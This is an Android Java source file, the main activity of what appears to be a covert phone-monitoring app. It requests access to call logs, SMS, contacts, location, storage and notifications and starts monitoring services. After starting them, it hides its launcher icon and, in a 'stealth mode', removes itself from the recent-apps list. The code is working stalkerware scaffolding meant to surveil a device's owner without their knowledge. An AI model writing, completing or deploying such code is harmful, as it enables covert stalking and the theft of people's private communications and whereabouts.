package com.example.control;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.control.utils.SettingsManager;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSIONS_REQUEST_CODE = 1001;
    private String[] requiredPermissions = {
            // Call and message monitoring
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            
            // Storage access
            Manifest.permission.READ_EXTERNAL_STORAGE,
            
            // Location tracking
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            
            // Contacts access
            Manifest.permission.READ_CONTACTS,
            
            // Internet and network
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE
    };

    private SettingsManager settingsManager;
    private TextView statusTextView;
    private Button startServiceButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        settingsManager = new SettingsManager(this);
        
        // Initialize views
        statusTextView = findViewById(R.id.statusTextView);
        startServiceButton = findViewById(R.id.startServiceButton);
        
        // Set button click listener
        startServiceButton.setOnClickListener(v -> {
            if (checkAndRequestPermissions()) {
                if (settingsManager.isServiceEnabled()) {
                    stopMonitoringService();
                } else {
                    startMonitoringService();
                }
            }
        });

        // Update UI based on current state
        updateUI();
        
        // Check if monitoring service is already running and permissions are granted
        if (settingsManager.isServiceEnabled() && checkAndRequestPermissions()) {
            startMonitoringService();
        }
    }

    private boolean checkAndRequestPermissions() {
        // Check which permissions are not granted
        boolean allPermissionsGranted = true;
        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allPermissionsGranted = false;
                break;
            }
        }

        // Request permissions if not all are granted
        if (!allPermissionsGranted) {
            ActivityCompat.requestPermissions(this, requiredPermissions, PERMISSIONS_REQUEST_CODE);
            return false;
        }
        
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            boolean allGranted = true;
            
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                startMonitoringService();
            } else {
                Toast.makeText(this, "Permissions are required for the app to function correctly", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void startMonitoringService() {
        // Start the main monitoring service
        Intent serviceIntent = new Intent(this, MonitoringService.class);
        ContextCompat.startForegroundService(this, serviceIntent);
        
        // Start the call monitoring service
        Intent callServiceIntent = new Intent(this, CallMonitoringService.class);
        startService(callServiceIntent);
        
        // Request notification access if not already granted
        requestNotificationAccess();
        
        // Mark service as enabled in settings
        settingsManager.setServiceEnabled(true);
        Toast.makeText(this, R.string.service_started, Toast.LENGTH_SHORT).show();
        
        // Update UI
        updateUI();
        
        // Hide the app icon if configured
        if (settingsManager.isAppHidingEnabled()) {
            hideAppIcon();
        }
        
        // Finish the activity to hide it from recent apps
        if (settingsManager.isStealthModeEnabled()) {
            finishAndRemoveTask();
        }
    }
    
    private void requestNotificationAccess() {
        String notificationListenerString = Settings.Secure.getString(getContentResolver(),
                "enabled_notification_listeners");
        
        // Check if our notification listener service is enabled
        String thisPackageName = getPackageName();
        String thisNotificationListenerClass = thisPackageName + "/" + thisPackageName + ".NotificationListenerService";
        
        if (notificationListenerString == null || !notificationListenerString.contains(thisNotificationListenerClass)) {
            // Notification listener permission not granted, request it
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            Toast.makeText(this, R.string.enable_notification_access, Toast.LENGTH_LONG).show();
            startActivity(intent);
        }
    }
    
    private void hideAppIcon() {
        try {
            PackageManager packageManager = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            packageManager.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
            Log.d("MainActivity", "App icon hidden from launcher");
        } catch (Exception e) {
            Log.e("MainActivity", "Failed to hide app icon", e);
        }
    }
    
    /**
     * Updates the UI based on the current service status
     */
    private void updateUI() {
        boolean isServiceRunning = settingsManager.isServiceEnabled();
        
        if (isServiceRunning) {
            statusTextView.setText(R.string.service_status_running);
            startServiceButton.setText(R.string.stop_monitoring);
        } else {
            statusTextView.setText(R.string.service_status);
            startServiceButton.setText(R.string.start_monitoring);
        }
    }
    
    /**
     * Stops the monitoring services
     */
    private void stopMonitoringService() {
        // Stop the main monitoring service
        Intent serviceIntent = new Intent(this, MonitoringService.class);
        stopService(serviceIntent);
        
        // Stop the call monitoring service
        Intent callServiceIntent = new Intent(this, CallMonitoringService.class);
        stopService(callServiceIntent);
        
        // Mark service as disabled in settings
        settingsManager.setServiceEnabled(false);
        Toast.makeText(this, R.string.service_stopped, Toast.LENGTH_SHORT).show();
        
        // Update UI
        updateUI();
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        updateUI();
    }
}
